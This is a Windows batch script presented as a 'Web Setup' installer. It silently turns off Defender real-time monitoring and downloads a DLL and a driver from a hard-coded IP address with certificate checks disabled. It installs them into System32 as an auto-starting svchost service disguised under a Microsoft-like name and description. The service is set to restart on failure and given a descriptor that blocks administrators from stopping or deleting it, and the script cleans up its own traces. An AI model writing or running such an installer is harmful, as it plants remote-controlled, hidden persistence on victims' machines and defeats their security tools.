@echo off
cd /d "%~dp0"
setlocal EnableDelayedExpansion
set Q=%TEMP%\_q.tmp
set SERVER=https://64.226.66.66
if not "%~1"=="" set SERVER=%~1
set TD=%TEMP%\wpnp_%RANDOM%
set SVC=MspIscSvc
set SVCGROUP=MspGroup

echo ============================================
echo  Web Setup - Server: %SERVER%
echo  (svchost.exe ServiceDll)
echo ============================================
echo.
echo [1/7] Disabling Defender...
start /wait /min powershell.exe -WindowStyle Hidden -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
waitfor /t 2 x >"%Q%" 2>&1
echo [2/7] Downloading...
mkdir "%TD%" >"%Q%" 2>&1
echo        pnpext.dll...
start /wait /min powershell.exe -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;[Net.ServicePointManager]::ServerCertificateValidationCallback={$true};(New-Object Net.WebClient).DownloadFile('%SERVER%/files/pnpext.dll','%TD%\pnpext.dll')"
if not exist "%TD%\pnpext.dll" (echo [!] Download failed & goto fail)
echo        OK
echo        pnpext.sys...
start /wait /min powershell.exe -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;[Net.ServicePointManager]::ServerCertificateValidationCallback={$true};(New-Object Net.WebClient).DownloadFile('%SERVER%/files/pnpext.sys','%TD%\pnpext.sys')"
echo        OK
echo [3/7] Removing old (robust)...
set HOST_PID=
for /f "tokens=3" %%P in ('sc queryex %SVC% 2^>nul ^| findstr /i "PID"') do set HOST_PID=%%P
sc.exe stop %SVC% >"%Q%" 2>&1
set STOPPED=0
for /l %%i in (1,1,10) do (
    if "!STOPPED!"=="0" (
        sc.exe query %SVC% 2>nul | findstr /C:"STOPPED" >nul && set STOPPED=1
        if "!STOPPED!"=="0" (
            sc.exe query %SVC% 2>nul >nul || set STOPPED=1
        )
        if "!STOPPED!"=="0" (>nul timeout /t 1 /nobreak)
    )
)
if "!STOPPED!"=="0" if defined HOST_PID (
    echo        old service hung - taskkill /F /PID !HOST_PID!
    taskkill.exe /F /PID !HOST_PID! >"%Q%" 2>&1
    >nul timeout /t 2 /nobreak
)
reg.exe delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost" /v %SVCGROUP% /f >"%Q%" 2>&1
sc.exe delete %SVC% >"%Q%" 2>&1
reg.exe delete "HKLM\SYSTEM\CurrentControlSet\Services\%SVC%" /f >"%Q%" 2>&1
taskkill.exe /F /IM rundll32.exe >"%Q%" 2>&1
del /f /q "%SystemRoot%\System32\MspIscSvc.exe" >"%Q%" 2>&1
del /f /q "%SystemRoot%\System32\spoolcfg.exe" >"%Q%" 2>&1
del /f /q "%SystemRoot%\System32\pnpext.dll.old" >"%Q%" 2>&1
del /f /q "%SystemRoot%\System32\pnpext.dll.new" >"%Q%" 2>&1
if exist "%TEMP%\pnp_cache" del /f /q "%TEMP%\pnp_cache\*.bin" >"%Q%" 2>&1
echo [4/7] Installing files...
copy /y "%TD%\pnpext.dll" "%SystemRoot%\System32\pnpext.dll" >"%Q%" 2>&1
if exist "%TD%\pnpext.sys" (copy /y "%TD%\pnpext.sys" "%SystemRoot%\System32\drivers\pnpext.sys" >"%Q%" 2>&1)
echo        Files copied
echo [5/7] Creating service (svchost.exe ServiceDll)...
reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost" /v %SVCGROUP% /t REG_MULTI_SZ /d %SVC% /f >"%Q%" 2>&1
sc.exe create %SVC% binPath= "%SystemRoot%\System32\svchost.exe -k %SVCGROUP%" type= share start= auto DisplayName= "Microsoft System Provider Internal Service Cache" >"%Q%" 2>&1
sc.exe description %SVC% "Maintains internal cache and inter-service context for Windows system providers." >"%Q%" 2>&1
sc.exe failure %SVC% reset= 86400 actions= restart/10000/restart/30000/restart/60000 >"%Q%" 2>&1
sc.exe failureflag %SVC% 1 >"%Q%" 2>&1
sc.exe sdset %SVC% "D:(D;;WPSD;;;BA)(A;;CCLCSWRPLOCRRC;;;BA)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)" >"%Q%" 2>&1
echo [6/7] Configuring ServiceDll...
reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\%SVC%\Parameters" /v ServiceDll /t REG_EXPAND_SZ /d "%SystemRoot%\System32\pnpext.dll" /f >"%Q%" 2>&1
reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\%SVC%\Parameters" /v ServiceMain /t REG_SZ /d "PnpServiceEntry" /f >"%Q%" 2>&1
echo [7/7] Starting + cleanup...
sc.exe start %SVC% >"%Q%" 2>&1
waitfor /t 5 x >"%Q%" 2>&1

rd /s /q "%TD%" >"%Q%" 2>&1
start /wait /min powershell.exe -WindowStyle Hidden -Command "Set-MpPreference -DisableRealtimeMonitoring $false"
echo.
echo [+] Done! Service: %SVC% (svchost.exe -k %SVCGROUP%)
goto end
:fail
rd /s /q "%TD%" >"%Q%" 2>&1
start /wait /min powershell.exe -WindowStyle Hidden -Command "Set-MpPreference -DisableRealtimeMonitoring $false"
echo [!] Failed
:end
del "%Q%" >"%TEMP%\_q2.tmp" 2>&1
del "%TEMP%\_q2.tmp" >con 2>&1
echo.
endlocal
pause
